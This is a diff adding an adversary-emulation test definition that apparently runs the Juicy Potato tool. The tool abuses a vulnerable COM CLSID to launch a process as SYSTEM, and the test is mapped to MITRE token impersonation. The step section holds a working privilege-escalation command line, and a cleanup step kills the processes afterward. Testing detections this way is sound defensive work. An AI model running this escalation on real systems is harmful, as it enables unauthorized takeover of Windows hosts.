@@ -1,0 +1,38 @@
+api_version: "2.0"
+name: Juicy Potato
+description: "This Atomic utilizes Juicy Potato to obtain privilege escalation. \nUpon successful execution of this test, a vulnerable CLSID will be used to execute a process with system permissions.\nThis tactic has been previously observed in SnapMC Ransomware, amongst numerous other campaigns. \n[Reference](https://blog.fox-it.com/2021/10/11/snapmc-skips-ransomware-steals-data/)"
+args:
+    - name: potato_path
+      type: path
+      default: PathToAtomicsFolder\..\ExternalPayloads\JuicyPotato.exe
+    - name: listening_port
+      type: integer
+      default: "7777"
+    - name: target_exe
+      type: path
+      default: $env:windir\system32\notepad.exe
+    - name: target_CLSID
+      type: string
+      default: '{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}'
+uuid: f095e373-b936-4eb4-8d22-f47ccbfbe64a
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+        - 'TA0004: Privilege Escalation'
+    techniques:
+        - 'T1134: Access Token Manipulation'
+    subtechniques:
+        - 'T1134.001: Token Impersonation/Theft'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: juicy-potato
+      inline: |
+        cmd /c '{{.Args.potato_path}}' -l '{{.Args.listening_port}}' -t * -p '{{.Args.target_exe}}' -c '{{.Args.target_CLSID}}'
+      executor: powershell
+      cleanup:
+        inline: |
+            get-ciminstance Win32_Process | where-object { $_.Path -eq "{{.Args.target_exe}}" } | invoke-cimmethod -methodname "terminate" | out-null
+            get-ciminstance Win32_Process | where-object { $_.Path -eq "{{.Args.potato_path}}" } | invoke-cimmethod -methodname "terminate" | out-null
+        executor: powershell
